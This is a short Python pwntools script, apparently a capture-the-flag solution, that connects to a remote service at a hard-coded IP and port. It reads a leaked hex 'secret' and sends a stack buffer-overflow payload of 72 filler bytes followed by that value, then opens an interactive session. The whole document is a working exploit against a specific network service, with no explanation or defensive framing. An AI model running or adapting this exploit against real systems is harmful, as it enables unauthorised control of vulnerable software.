from pwn import *
# nc 34.162.142.123 5000
r = remote('34.162.142.123', 5000)

r.recvuntil(b'secret: ')
secret = int(r.recvline().strip(), 16)
print(f'secret: {secret:x}')

payload = b'A' * 72 + p64(secret)

r.sendlineafter(b'text: ', payload)
r.interactive()